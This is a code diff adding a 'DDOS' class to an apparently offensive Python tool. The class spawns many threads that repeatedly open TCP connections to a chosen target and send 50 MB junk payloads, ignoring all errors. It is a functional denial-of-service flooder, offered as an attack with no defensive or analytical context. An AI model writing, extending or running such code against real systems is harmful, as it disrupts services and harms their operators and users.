@@ -3,6 +3,28 @@ import socket
 import threading
 import requests
 
+class DDOS:
+
+    def start(target_ip, target_port, num_threads, packet_size_mb=50):
+        target_address = (target_ip, target_port)
+        packet_size = packet_size_mb * 1024 * 1024
+    
+        def attack():
+            while True:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect(target_address)
+                    payload = b'A' * packet_size
+                    s.sendto(payload, target_address)
+                    s.close()
+                    print(f"    {hashtag_red} {c.cyan('Attacking')}")
+                except:
+                    pass
+    
+        for _ in range(num_threads):
+            thread = threading.Thread(target=attack)
+            thread.start()
+
 class d:
     def __init__(self, target_ip, target_port):
         self.target_ip = target_ip
